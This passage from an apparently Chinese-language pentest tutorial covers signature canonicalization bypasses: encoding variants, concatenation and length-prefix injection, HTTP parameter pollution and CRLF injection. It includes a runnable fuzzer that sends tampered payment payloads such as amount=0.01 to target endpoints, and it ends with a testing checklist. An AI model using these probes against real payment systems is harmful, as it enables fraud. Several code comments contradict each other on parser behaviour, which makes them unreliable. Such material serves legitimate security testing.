            "sign_ok": True,  # 假设签名通过
            "a": parts[0] if len(parts) > 0 else "",
            "b": parts[1] if len(parts) > 1 else "",
            "c": parts[2] if len(parts) > 2 else "",
            "extra": parts[3:] if len(parts) > 3 else [],
        }
    
    # 正常
    raw1, sig1 = sign("user", "normal", "amount=100")
    print(f"正常: {raw1}")
    
    # 注入 |
    raw2, sig2 = sign("user", "normal|amount=0.01", "amount=100")
    print(f"注入: {raw2}")
    result = verify_and_parse(sig2, raw2, "user", "amount=100")
    print(f"解析: {result}")
```

### 5.3 长度前缀拼接

```python
def length_prefix_concat():
    """
    安全做法: 用长度前缀防止注入
    sign = hash(len(a) + a + len(b) + b)
    但长度本身也可能被注入
    """
    
    def sign_safe(a, b):
        # 长度前缀 (定长 4 字节)
        raw = f"{len(a):04d}{a}{len(b):04d}{b}"
        sig = hashlib.sha256(raw.encode()).hexdigest()
        return raw, sig
    
    def sign_unsafe(a, b):
        # 变长长度前缀
        raw = f"{len(a)}{a}{len(b)}{b}"
        sig = hashlib.sha256(raw.encode()).hexdigest()
        return raw, sig
    
    # 正常
    print("正常拼接:")
    raw1, sig1 = sign_unsafe("hello", "world")
    print(f"  raw: {raw1}")
    
    # 注入: a = "5hellox"
    # 长度前缀: 6 → "6" + "5hellox" = "65hellox"
    # 解析时: 取 len=6, 但 a 实际上是 "5hello"
    # 剩余的 "x" 被解释为 b 的长度前缀的一部分
    
    a_inject = "x" * 50 + "admin"
    raw2, sig2 = sign_unsafe(a_inject, "innocent")
    print(f"注入变长前缀:")
    print(f"  raw[:30]: {raw2[:30]}...")
    print(f"  len(a)={len(a_inject)}, 原始值: {repr(a_inject[:20])}...")
    
    # 安全方案: 固定长度前缀
    print("\n固定长度前缀 (安全):")
    raw3, sig3 = sign_safe("hello", "world")
    print(f"  raw: {raw3}")
    raw4, sig4 = sign_safe(a_inject, "innocent")
    print(f"  raw[:40]: {raw4[:40]}...")
    # 即使 a 包含分隔符, 长度是固定的 4 位, 解析不会偏移
```

## 6. 编码层攻击

### 6.1 Base64 变体

```python
# encoding_layer_attacks.py — 编码层规范化攻击
import hashlib, base64, hmac

def base64_variant_attack():
    """Base64 编码变体差异"""
    
    data = b"hello world"
    
    variants = {
        "std": base64.b64encode(data).decode(),                  # aGVsbG8gd29ybGQ=
        "urlsafe": base64.urlsafe_b64encode(data).decode(),      # aGVsbG8gd29ybGQ=
        "no_pad": base64.b64encode(data).decode().rstrip("="),   # aGVsbG8gd29ybGQ
        "no_pad_urlsafe": base64.urlsafe_b64encode(data).decode().rstrip("="),
        "std_wrap": base64.b64encode(data, altchars=b"+").decode(),
    }
    
    print("Base64 变体:")
    for name, val in variants.items():
        sig = hashlib.sha256(val.encode()).hexdigest()[:16]
        print(f"  {name:20s} {val:25s} sign={sig}")
    
    # 如果签名用标准 base64, 验签用 urlsafe base64:
    # 数据中如果包含 + → urlsafe 变成 -
    # → 签名不同!
    
    print()
    print("攻击场景:")
    print("- 签名方: base64(original) → sign = hash(b64)")
    print("- 验签方: 收到 b64, 先 decode 再 encode 再 hash")
    print("- 但如果 decode 再 encode 的结果不同 (填充、换行)...")
    
    # 换行攻击:
    b64_with_newline = "aGVsbG8g\nd29ybGQ="  # base64 中间有换行
    decoded = base64.b64decode(b64_with_newline)
    reencoded = base64.b64encode(decoded).decode()
    print(f"\n换行 base64: {repr(b64_with_newline)}")
    print(f"  decode → {decoded}")
    print(f"  re-encode → {reencoded}")
    print(f"  原始相等: {reencoded == 'aGVsbG8gd29ybGQ='}")
```

### 6.2 Hex 大小写

```python
def hex_case_attack():
    """Hex 大小写差异"""
    
    data = b"hello"
    md5_hex = hashlib.md5(data).hexdigest()
    
    variants = {
        "lower": md5_hex,
        "upper": md5_hex.upper(),
        "mixed": "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(md5_hex)),
    }
    
    print("Hex 大小写:")
    for name, val in variants.items():
        sig = hashlib.sha256(val.encode()).hexdigest()[:16]
        print(f"  {name:10s} {val:35s} sign={sig}")
    
    # 如果签名方返回大写 hex, 验签方比较小写 hex:
    # → 不匹配 (除非两边都做 case-insensitive 比较)
    # 但如果攻击者可以提供 hex 值:
    # → 发送大写 hex 绕过小写 hex 的签名检查
```

### 6.3 Raw bytes vs hex string vs base64

```python
def raw_vs_encoded():
    """同一数据的多种编码形式的签名差异"""
    
    data = b"\x00\x01\x02\xff\xfe"
    
    forms = {
        "raw_bytes": data,
        "hex_lower": data.hex(),
        "hex_upper": data.hex().upper(),
        "base64_std": base64.b64encode(data).decode(),
        "base64_urlsafe": base64.urlsafe_b64encode(data).decode(),
    }
    
    print("同一数据的不同编码:")
    for name, val in forms.items():
        if isinstance(val, bytes):
            sig_val = val
        else:
            sig_val = val.encode()
        sig = hashlib.sha256(sig_val).hexdigest()[:16]
        print(f"  {name:20s} {repr(val)[:30]:30s} sign={sig}")
    
    print()
    print("关键: 所有 sign 不同, 即使"逻辑上"是同一笔数据")
    print("如果签名方用 raw bytes, 验签方用 hex:")
    print("  sign(hash(data)) ≠ sign(hash(data.hex()))")
```

### 6.4 UTF-8 规范化形式

```python
def utf8_normalization_attack():
    """Unicode 正规化攻击"""
    
    # Unicode 有 4 种正规化形式:
    # NFC: 组合形式 (é 作为单个码点)
    # NFD: 分解形式 (é = e + combining accent)
    # NFKC: 兼容组合
    # NFKD: 兼容分解
    
    import unicodedata
    
    # 字符 é 的两种表示:
    nfc = "é"        # 组合形式: é (一个码点)
    nfd = "é"  # 分解形式: e + ́ (两个码点)
    
    print(f"NFC: {repr(nfc)} → bytes: {nfc.encode('utf-8').hex()}")
    print(f"NFD: {repr(nfd)} → bytes: {nfd.encode('utf-8').hex()}")
    
    # 它们在 NFC 下相同:
    print(f"\nunicodedata.normalize('NFC', nfc) == unicodedata.normalize('NFC', nfd): {unicodedata.normalize('NFC', nfc) == unicodedata.normalize('NFC', nfd)}")
    
    # 但 raw bytes 不同:
    print(f"nfc.encode() == nfd.encode(): {nfc.encode() == nfd.encode()}")
    
    # 如果签名方用 NFD, 验签方用 NFC:
    sign_nfc = hashlib.sha256(nfc.encode()).hexdigest()[:16]
    sign_nfd = hashlib.sha256(nfd.encode()).hexdigest()[:16]
    print(f"\nsign(NFC): {sign_nfc}")
    print(f"sign(NFD): {sign_nfd}")
    print(f"Match: {sign_nfc == sign_nfd}")
    
    # 更多: 全角 vs 半角
    fullwidth = "１００"  # １００
    halfwidth = "100"                  # 100
    
    print(f"\n全角: {repr(fullwidth)} → {fullwidth.encode('utf-8').hex()}")
    print(f"半角: {repr(halfwidth)} → {halfwidth.encode('utf-8').hex()}")
    print(f"NFKC 后相等: {unicodedata.normalize('NFKC', fullwidth) == halfwidth}")
    
    sign_fw = hashlib.sha256(fullwidth.encode()).hexdigest()[:16]
    sign_hw = hashlib.sha256(halfwidth.encode()).hexdigest()[:16]
    print(f"sign(全角): {sign_fw}")
    print(f"sign(半角): {sign_hw}")
```

## 7. 参数污染/注入 (HPP)

### 7.1 不同语言的重复参数处理

```python
# hpp_attacks.py — HTTP 参数污染攻击
import urllib.parse

def hpp_language_behavior():
    """不同语言对重复参数的处理"""
    
    query_string = "amount=100&amount=0.01&role=user&role=admin"
    
    print(f"Query: {query_string}")
    print()
    
    # Python urllib.parse.parse_qs → 数组
    py_qs = urllib.parse.parse_qs(query_string)
    print(f"Python parse_qs:     {py_qs}")
    print(f"  → amount = {py_qs.get('amount')}")
    
    # Python urllib.parse.parse_qsl → 第一项 wins
    py_qsl = dict(urllib.parse.parse_qsl(query_string))
    print(f"Python parse_qsl:    {py_qsl}")
    print(f"  → amount = {py_qsl.get('amount')}")  # 最后一个 wins
    
    # PHP: $_GET → 最后一个 wins
    # Java: getParameter() → 第一个 wins
    # Go: r.URL.Query() → 第一个 wins
    # Node.js Express: req.query → 最后一个 wins
    # .NET: Request.QueryString → 数组
    
    behaviors = {
        "PHP": "last wins",
        "Java Servlet": "first wins",
        "Go net/http": "first wins",
        "Python parse_qs": "array",
        "Python parse_qsl": "last wins",
        "Node.js Express": "last wins",
        ".NET": "array (通过 name[index] 访问)",
        "Perl CGI": "first wins",
        "Ruby Rack": "last wins",
        "Apache mod_rewrite": "last wins",
    }
    
    print()
    print("各语言/框架行为:")
    for lang, behavior in behaviors.items():
        print(f"  {lang:25s} → {behavior}")
    
    print()
    print("攻击场景:")
    print("PHP 后端签名: amount=100 (用于计算 sign)")
    print("PHP 后端验签: amount=0.01 (最后一个 wins)")
    print("→ 同时传 amount=100&amount=0.01")
    print("→ 签名用 100, 实际处理用 0.01!")
    print("  (但 PHP 的 $_GET 也是 last wins)")
    print("  → 所以签名和验签都 last wins → 一致")
    print("  → 攻击者需要在签名方和验签方之间造成不一致!")
    print()
    print("真实案例: 签名在 Python (parse_qsl, first wins)")
    print("          验签在 PHP (last wins)")
    print("  → amount=0.01&amount=100")
    print("  → 签名用 0.01, 验签用 100")
    print("  → 或者反过来: amount=100&amount=0.01")
    print("  → 签名用 100 (匹配), 验签用 0.01 (绕过!)")
```

### 7.2 CRLF 注入参数

```python
def crlf_param_injection():
    """在参数值中注入换行符"""
    
    # 如果签名是把所有参数拼接成一行:
    # sign = hash("amount=100&status=paid")
    # 但参数值包含 \r\n:
    # amount=100%0d%0astatus=paid
    # 经过 url decode: amount=100\r\nstatus=paid
    # 有些系统会把 \r\n 当作参数分隔符
    
    # 场景: 日志签名绕过
    # sign = hash("action=refund&amount=100&timestamp=...")
    # 注入 action=refund&amount=100  → 日志被污染
    # 或者注入 &action=refund&amount=0.01 来改变执行
    
    print("CRLF 注入:")
    malicious_amount = "100%0d%0aaction=approve%0d%0astatus=success"
    print(f"  注入值: {malicious_amount}")
    print(f"  decode: {urllib.parse.unquote(malicious_amount)}")
    
    # 如果签名系统拼接: sign = hash("amount=" + amount + "&action=refund")
    # 正常:    hash("amount=100&action=refund")
    # 注入后:  hash("amount=100\r\naction=approve\r\nstatus=success&action=refund")
    # 但有些 HTTP 解析器会把 \r\n 视为换行, 而不是参数分隔符
    
    # 更实际的攻击: 多行 HTTP header
    # 如果签名包含 header 值, 注入 CRLF → 可以伪造 header
```

### 7.3 参数注入自动化

```python
def hpp_fuzzer(endpoint: str, param: str, base_params: dict):
    """HTTP 参数污染 fuzzer"""
    import requests
    
    # 重复参数的不同排列
    arrangements = [
        # [sign_value, logic_value]
        [("amount", "100"), ("amount", "0.01")],   # 100 first
        [("amount", "0.01"), ("amount", "100")],   # 0.01 first
        [("amount", "100"), ("amount", "0.01"), ("amount", "0")],
        [("amount", "0.01"), ("amount", "100"), ("amount", "0.01")],
    ]
    
    results = []
    for arr in arrangements:
        # 构造 query string (保持顺序)
        qs = "&".join(f"{k}={v}" for k, v in arr)
        url = f"{endpoint}?{qs}"
        
        r = requests.get(url, timeout=10)
        results.append({
            "arrangement": arr,
            "qs": qs,
            "status": r.status_code,
            "body": r.text[:200],
        })
        
        # 也尝试 POST form data
        form_data = {k: [v for k2, v in arr if k2 == k] for k in set(k for k, _ in arr)}
        r2 = requests.post(endpoint, data=form_data, timeout=10)
        results.append({
            "arrangement": arr,
            "method": "POST",
            "status": r2.status_code,
            "body": r2.text[:200],
        })
    
    return results
```

## 8. 完整自动化脚本: canonicalization_fuzzer.py

```python
#!/usr/bin/env python3
"""
canonicalization_fuzzer.py — 签名规范化 Fuzzer

向目标端点发送同一逻辑 payload 的不同规范化形式, 寻找签名不一致。
如果某个变体被接受但其他变体被拒绝, 就说明存在规范化差异漏洞。

用法:
    python canonicalization_fuzzer.py --url https://target.com/api/pay \
        --param-template '{"amount": "100", "order_id": "ORD001"}' \
        --sign-field sign
"""

import argparse
import hashlib
import hmac
import json
import urllib.parse
import requests
import itertools
import sys
from typing import Any, Callable

# =========================================================
# 规范化变换器
# =========================================================

class CanonicalizationFuzzer:
    """对 payload 施加不同规范化变换并探测差异性"""
    
    def __init__(self, base_params: dict, sign_field: str = "sign"):
        self.base = base_params
        self.sign_field = sign_field
        self.results = []
    
    # --- 参数排序变体 ---
    
    def param_order_variants(self) -> list[tuple[str, dict]]:
        """生成不同参数排序的变体"""
        keys = list(self.base.keys())
        variants = []
        for perm in set(itertools.permutations(keys)):
            ordered = {k: self.base[k] for k in perm}
            variants.append((f"order_{'_'.join(perm[:3])}", ordered))
        return variants[:12]  # 限制数量
    
    def param_sort_variants(self) -> list[tuple[str, dict]]:
        """模拟不同语言的排序变体"""
        variants = []
        
        # Python sorted (字典序)
        py_sorted = dict(sorted(self.base.items()))
        variants.append(("py_sorted", py_sorted))
        
        # PHP ksort 模拟 (数字 key 优先)
        php_sorted = {}
        int_keys = {}
        str_keys = {}
        for k, v in self.base.items():
            try:
                int(k)
                int_keys[k] = v
            except (ValueError, TypeError):
                str_keys[k] = v
        for k in sorted(int_keys, key=lambda x: int(x)):
            php_sorted[k] = int_keys[k]
        for k in sorted(str_keys):
            php_sorted[k] = str_keys[k]
        variants.append(("php_ksort", php_sorted))
        
        # JS Object.keys 模拟 (数字升序, 字符串插入序)
        js_sorted = {}
        for k in sorted([k for k in self.base if k.isdigit()], key=int):
            js_sorted[k] = self.base[k]
        for k in self.base:
            if not k.isdigit():
                js_sorted[k] = self.base[k]
        variants.append(("js_keys", js_sorted))
        
        # 逆序
        variants.append(("reversed", dict(reversed(list(self.base.items())))))
        
        return variants
    
    # --- URL 编码变体 ---
    
    def url_encode_variants(self) -> list[tuple[str, str]]:
        """生成不同 URL 编码方式的 query_string"""
        variants = []
        
        for param_name, param_value in self.base.items():
            # + 编码空格
            qs_plus = f"{param_name}={urllib.parse.quote_plus(str(param_value))}"
            # %20 编码空格
            qs_pct20 = f"{param_name}={urllib.parse.quote(str(param_value), safe='')}"
            # 不编码 (raw)
            qs_raw = f"{param_name}={param_value}"
            # 双编
            qs_double = f"{param_name}={urllib.parse.quote(urllib.parse.quote(str(param_value), safe=''), safe='')}"
            
            # 放到完整 query string 中
            # 注意: 这只变了当前参数, 其他参数用默认方式
            pass
        
        # 整体 query string 变体
        pairs_default = urllib.parse.urlencode(self.base)
        pairs_quote_plus = "&".join(
            f"{k}={urllib.parse.quote_plus(str(v))}" for k, v in self.base.items()
        )
        pairs_quote = "&".join(
            f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in self.base.items()
        )
        pairs_raw = "&".join(f"{k}={v}" for k, v in self.base.items())
        
        # 混合: 一部分用 quote_plus, 一部分用 quote
        items = list(self.base.items())
        pairs_mixed = "&".join(
            f"{k}={urllib.parse.quote_plus(str(v))}" if i % 2 == 0 else f"{k}={urllib.parse.quote(str(v), safe='')}"
            for i, (k, v) in enumerate(items)
        )
        
        variants = [
            ("urlencode_std", pairs_default),
            ("urlencode_plus", pairs_quote_plus),
            ("urlencode_pct20", pairs_quote),
            ("urlencode_raw", pairs_raw),
            ("urlencode_mixed", pairs_mixed),
        ]
        
        # 双编每个 value
        pairs_double = "&".join(
            f"{k}={urllib.parse.quote(urllib.parse.quote(str(v), safe=''), safe='')}"
            for k, v in self.base.items()
        )
        variants.append(("urlencode_double", pairs_double))
        
        return variants
    
    # --- JSON 变体 ---
    
    def json_variants(self) -> list[tuple[str, str]]:
        """生成不同 JSON 序列化方式的变体"""
        variants = []
        
        # 无空格
        variants.append(("json_compact", json.dumps(self.base, separators=(",", ":"))))
        
        # 标准 2 空格
        variants.append(("json_indent2", json.dumps(self.base, indent=2)))
        
        # 4 空格
        variants.append(("json_indent4", json.dumps(self.base, indent=4)))
        
        # Tab 缩进
        variants.append(("json_tab", json.dumps(self.base, indent="\t")))
        
        # sort_keys (JCS 风格)
        variants.append(("json_sorted", json.dumps(self.base, sort_keys=True)))
        
        # 全部 key 用双引号 (标准 JSON 就是, 但 Python 默认)
        # 测试 ensure_ascii
        variants.append(("json_ascii", json.dumps(self.base, ensure_ascii=True)))
        
        # 没有尾随换行
        variants.append(("json_no_newline", json.dumps(self.base)))
        
        return variants
    
    # --- 多部分拼接变体 ---
    
    def concat_variants(self) -> list[tuple[str, str]]:
        """生成不同拼接方式的变体"""
        variants = []
        
        # & 连接
        pairs_amp = "&".join(f"{k}={v}" for k, v in self.base.items())
        variants.append(("concat_amp", pairs_amp))
        
        # | 连接
        pairs_pipe = "|".join(f"{k}={v}" for k, v in self.base.items())
        variants.append(("concat_pipe", pairs_pipe))
        
        # , 连接
        pairs_comma = ",".join(f"{k}={v}" for k, v in self.base.items())
        variants.append(("concat_comma", pairs_comma))
        
        # key-value 拼接无分隔符
        pairs_raw = "".join(f"{k}{v}" for k, v in self.base.items())
        variants.append(("concat_raw", pairs_raw))
        
        # XML-like
        xml_body = "<root>" + "".join(f"<{k}>{v}</{k}>" for k, v in self.base.items()) + "</root>"
        variants.append(("concat_xml", xml_body))
        
        # JSON 数组
        arr_body = json.dumps([self.base])
        variants.append(("concat_json_arr", arr_body))
        
        return variants
    
    # --- 重复参数变体 ---
    
    def duplicate_param_variants(self) -> list[tuple[str, str]]:
        """生成重复参数的变体 (HPP)"""
        variants = []
        
        items = list(self.base.items())
        if len(items) >= 2:
            # 取前两个参数做重复
            k1, v1 = items[0]
            k2, v2 = items[1]
            
            # 重复 k1, 不同值
            dup_first = "&".join([
                f"{k1}={v1}",
                f"{k1}=injected",
                *[f"{k}={v}" for k, v in items[1:]],
            ])
            variants.append(("hpp_dup_first", dup_first))
            
            # 重复 k2, 不同值
            dup_second = "&".join([
                f"{k1}={v1}",
                f"{k2}=injected",
                f"{k2}={v2}",
                *[f"{k}={v}" for k, v in items[2:]],
            ])
            variants.append(("hpp_dup_second", dup_second))
            
            # 所有参数都重复 (不同值)
            all_dup = "&".join(
                f"{k}={v}&{k}=injected_{k}" for k, v in items
            )
            variants.append(("hpp_all", all_dup))
        
        return variants
    
    # --- Base64 编码变体 ---
    
    def base64_variants(self) -> list[tuple[str, str]]:
        """生成不同 Base64 编码的变体"""
        import base64
        
        variants = []
        raw_data = json.dumps(self.base).encode()
        
        b64_std = base64.b64encode(raw_data).decode()
        b64_urlsafe = base64.urlsafe_b64encode(raw_data).decode()
        b64_no_pad = b64_std.rstrip("=")
        b64_wrap = "\n".join(b64_std[i:i+76] for i in range(0, len(b64_std), 76))
        b64_upper = b64_std.upper()  # 某些实现接受大写字母
        
        variants.extend([
            ("b64_std", b64_std),
            ("b64_urlsafe", b64_urlsafe),
            ("b64_no_pad", b64_no_pad),
            ("b64_line_wrap", b64_wrap),
            ("b64_upper", b64_upper),
        ])
        
        return variants
    
    # =========================================================
    # 签名生成
    # =========================================================
    
    def sign_query(self, query_string: str, secret: str = "test") -> str:
        """用 HMAC-SHA256 对 query string 签名"""
        return hmac.new(secret.encode(), query_string.encode(), hashlib.sha256).hexdigest()
    
    def sign_json(self, json_str: str, secret: str = "test") -> str:
        return hmac.new(secret.encode(), json_str.encode(), hashlib.sha256).hexdigest()
    
    # =========================================================
    # 探测执行
    # =========================================================
    
    def probe(self, url: str, form_style: str = "json"):
        """对目标端点发送所有变体"""
        session = requests.Session()
        
        # 收集所有变体
        all_variants = []
        
        # JSON body 变体
        if form_style == "json":
            for name, json_str in self.json_variants():
                sig = self.sign_json(json_str)
                all_variants.append(("json", name, json_str, sig))
        
        # Query string / form 变体
        elif form_style == "form":
            for name, qs in self.url_encode_variants():
                sig = self.sign_query(qs)
                all_variants.append(("form", name, qs, sig))
            
            for name, qs in self.concat_variants():
                sig = self.sign_query(qs)
                all_variants.append(("concat", name, qs, sig))
            
            for name, qs in self.duplicate_param_variants():
                sig = self.sign_query(qs)
                all_variants.append(("hpp", name, qs, sig))
        
        print(f"\n{'='*80}")
        print(f"Canonicalization Fuzzer")
        print(f"Target: {url}")
        print(f"Base params: {self.base}")
        print(f"Form style: {form_style}")
        print(f"{'='*80}\n")
        
        for category, name, payload, sig in all_variants:
            full_url = f"{url}?{payload}&{self.sign_field}={sig}" if form_style == "form" else url
            body = payload if form_style == "form" else {"data": payload, self.sign_field: sig}
            
            try:
                if form_style == "json":
                    r = session.post(url, json=json.loads(f'{{"data": {json.dumps(payload)}, "{self.sign_field}": "{sig}"}}'),
                                     timeout=10)
                else:
                    r = session.get(full_url, timeout=10)
                
                is_accepted = r.status_code == 200 and "success" in r.text.lower()
                
                print(f"[{category:8s}] {name:25s} | status={r.status_code} | "
                      f"accepted={'✓' if is_accepted else '✗'} | "
                      f"sig={sig[:12]}...")
                
                self.results.append({
                    "category": category,
                    "name": name,
                    "status": r.status_code,
                    "accepted": is_accepted,
                    "payload": payload[:100],
                    "sig": sig,
                    "response": r.text[:100],
                })
                
            except Exception as e:
                print(f"[{category:8s}] {name:25s} | ERROR: {e}")
        
        # 分析结果
        self._analyze()
    
    def _analyze(self):
        """分析哪些变体被接受, 寻找差异"""
        accepted = [r for r in self.results if r["accepted"]]
        rejected = [r for r in self.results if not r["accepted"]]
        
        print(f"\n{'='*80}")
        print(f"分析结果:")
        print(f"  总变体: {len(self.results)}")
        print(f"  接受:   {len(accepted)}")
        print(f"  拒绝:   {len(rejected)}")
        
        if 0 < len(accepted) < len(self.results):
            print(f"\n  [!] 发现不一致! 某些变体被接受, 某些被拒绝:")
            for r in accepted:
                print(f"      ✓ [{r['category']}] {r['name']} (sig={r['sig'][:12]}...)")
            print(f"\n      这表明签名系统存在规范化差异漏洞!")
            print(f"      攻击者可以用被接受的变体绕过签名检查。")
        elif len(accepted) == 0:
            print(f"\n  [!] 所有变体都被拒绝。")
            print(f"      可能: 密钥错误、端点不对、或签名检查严格。")
        elif len(accepted) == len(self.results):
            print(f"\n  [-] 所有变体都被接受。")
            print(f"      可能: 端点没有签名检查、或所有变体都通过了。")


# =========================================================
# Haupt
# =========================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Canonicalization Fuzzer")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param-template", default='{"amount":"100","order_id":"ORD001"}',
                        help="JSON template for parameters")
    parser.add_argument("--sign-field", default="sign", help="Signature field name")
    parser.add_argument("--form-style", choices=["json", "form"], default="json",
                        help="Request format")
    args = parser.parse_args()
    
    params = json.loads(args.param_template)
    fuzzer = CanonicalizationFuzzer(params, args.sign_field)
    fuzzer.probe(args.url, args.form_style)
```

### 8.1 本地测试 (无依赖)

```python
# canonicalization_self_test.py — 无网络依赖的本地测试
# 验证 canonicalization_fuzzer.py 的逻辑, 不需要目标 URL

import hashlib
import hmac
import json

# 测试场景: 模拟签名方和验签方使用不同的规范化
# 找到"同一逻辑数据, 不同签名"的组合

def simulate_discrepancy():
    """找出一组能让签名方和验签方不一致的 payload"""
    
    secret = "test_secret"
    
    # === 场景 1: 参数排序 ===
    signer_params = {"amount": "100", "status": "paid", "order": "ORD001"}
    verifier_params = {"order": "ORD001", "status": "paid", "amount": "100"}
    
    signer_raw = "&".join(f"{k}={v}" for k, v in sorted(signer_params.items()))
    verifier_raw = "&".join(f"{k}={v}" for k, v in verifier_params.items())
    
    sig_sign = hmac.new(secret.encode(), signer_raw.encode(), hashlib.sha256).hexdigest()
    sig_veri = hmac.new(secret.encode(), verifier_raw.encode(), hashlib.sha256).hexdigest()
    
    print(f"场景 1 - 参数排序不一致:")
    print(f"  signer: {signer_raw} → {sig_sign[:16]}...")
    print(f"  verifier: {verifier_raw} → {sig_veri[:16]}...")
    print(f"  匹配: {sig_sign == sig_veri}")
    
    if sig_sign == sig_veri:
        print("  (排序一致, 没有漏洞)")
    else:
        print("  (排序不一致, 有漏洞!)")
    print()
    
    # === 场景 2: URL 编码 ===
    params = {"name": "hello world"}
    signer_qs = "name=hello+world"
    verifier_qs = "name=hello%20world"
    
    sig_s = hmac.new(secret.encode(), signer_qs.encode(), hashlib.sha256).hexdigest()
    sig_v = hmac.new(secret.encode(), verifier_qs.encode(), hashlib.sha256).hexdigest()
    
    print(f"场景 2 - URL 编码 (space + vs %20):")
    print(f"  signer: {signer_qs} → {sig_s[:16]}...")
    print(f"  verifier: {verifier_qs} → {sig_v[:16]}...")
    print(f"  匹配: {sig_s == sig_v}")
    if sig_s != sig_v:
        print("  [!] 可利用: 空格编码差异导致的签名不匹配")
    print()
    
    # === 场景 3: JSON 空白 ===
    data = {"a": 1, "b": 2}
    signer_json = json.dumps(data, separators=(",", ":"))
    verifier_json = json.dumps(data, indent=2)
    
    sig_s = hmac.new(secret.encode(), signer_json.encode(), hashlib.sha256).hexdigest()
    sig_v = hmac.new(secret.encode(), verifier_json.encode(), hashlib.sha256).hexdigest()
    
    print(f"场景 3 - JSON 空白:")
    print(f"  signer: {signer_json} → {sig_s[:16]}...")
    print(f"  verifier: {verifier_json} → {sig_v[:16]}...")
    print(f"  匹配: {sig_s == sig_v}")
    if sig_s != sig_v:
        print("  [!] 可利用: JSON 空白差异")
    print()
    
    # === 场景 4: Base64 填充 ===
    import base64
    data_bin = b"test data"
    signer_b64 = base64.b64encode(data_bin).decode()  # dGVzdCBkYXRh
    verifier_b64 = base64.b64encode(data_bin).decode().rstrip("=")  # dGVzdCBkYXRh
    
    sig_s = hashlib.md5(signer_b64.encode()).hexdigest()
    sig_v = hashlib.md5(verifier_b64.encode()).hexdigest()
    
    print(f"场景 4 - Base64 填充:")
    print(f"  signer: {signer_b64} → {sig_s[:16]}...")
    print(f"  verifier: {verifier_b64} → {sig_v[:16]}...")
    print(f"  匹配: {sig_s == sig_v}")
    if sig_s != sig_v:
        print("  [!] 可利用: Base64 填充差异")
    print()
    
    # === 场景 5: HPP ===
    # 签名方 (Python parse_qsl, last wins): amount from 100
    # 验签方 (PHP, last wins): amount from 0.01
    hpp_qs = "amount=100&amount=0.01"
    
    # 签名时可能取第一个? 取最后一个?
    py_first = urllib.parse.parse_qsl(hpp_qs)[0]  # ('amount', '100')
    py_last = list(urllib.parse.parse_qsl(hpp_qs))[-1]  # ('amount', '0.01')
    
    print(f"场景 5 - HPP: {hpp_qs}")
    print(f"  Python parse_qsl first: {py_first}")
    print(f"  Python parse_qsl last:  {py_last}")
    print(f"  PHP $_GET:              ('amount', '0.01') (last wins)")
    
    # 如果签名用 first, 验签用 last:
    sig_first = hmac.new(secret.encode(), py_first[1].encode(), hashlib.sha256).hexdigest()
    sig_last = hmac.new(secret.encode(), py_last[1].encode(), hashlib.sha256).hexdigest()
    print(f"  sign(100) = {sig_first[:16]}...")
    print(f"  sign(0.01) = {sig_last[:16]}...")
    print(f"  匹配: {sig_first == sig_last}")
    if sig_first != sig_last and py_first[1] != py_last[1]:
        print("  [!] 可利用: HPP 签名/验签不一致")

if __name__ == "__main__":
    import urllib.parse
    simulate_discrepancy()
```

## 实战 Checklist

发现签名系统时, 逐一检查以下规范化差异:

```
[ ] 参数顺序: 签名方排序了吗? 验签方排序了吗? 排序算法一致吗?
[ ] sign 字段是否参与排序? 导致先有鸡还是先有蛋的问题?
[ ] 跨语言排序: PHP ksort vs Python sorted vs JS Object.keys?
[ ] URL 编码: space → + or %20? 双编? 选择性编码?
[ ] Unicode: UTF-8 vs GBK? NFC vs NFD? 全角 vs 半角?
[ ] JSON 空白: 签名方和验签方用相同的 separators?
[ ] JSON key 顺序: sort_keys=True? 数字 key 被当作数组?
[ ] JSON 数字: 100 vs 100.0 vs 1e2?
[ ] JSON 重复 key: 哪边 first wins, 哪边 last wins?
[ ] XML C14N: Inclusive vs Exclusive? 命名空间一致?
[ ] 拼接顺序: part order? 分隔符可注入?
[ ] 长度前缀: 可变长度? 固定长度?
[ ] Base64: 标准 vs urlsafe? 填充? 换行?
[ ] Hex: 大小写敏感?
[ ] HPP: 重复参数在不同语言的处理?
[ ] CRLF: 参数值中能否注入分隔符?
```

## 参考

- [RFC 8785 — JSON Canonicalization Scheme (JCS)](https://www.rfc-editor.org/rfc/rfc8785)
- [RFC 3986 — URI 编码规范](https://www.rfc-editor.org/rfc/rfc3986)
- [XML C14N (Canonical XML)](https://www.w3.org/TR/xml-c14n11/)
- [Exclusive XML Canonicalization](https://www.w3.org/TR/xml-exc-c14n/)
- [XML Signature Wrapping — OWASP](https://owasp.org/www-pdf-archive/XML_Signature_Wrapping.pdf)
- [PHP ksort vs JavaScript Object.keys](https://www.php.net/manual/en/function.ksort.php)
- [HTTP Parameter Pollution — OWASP](https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution)
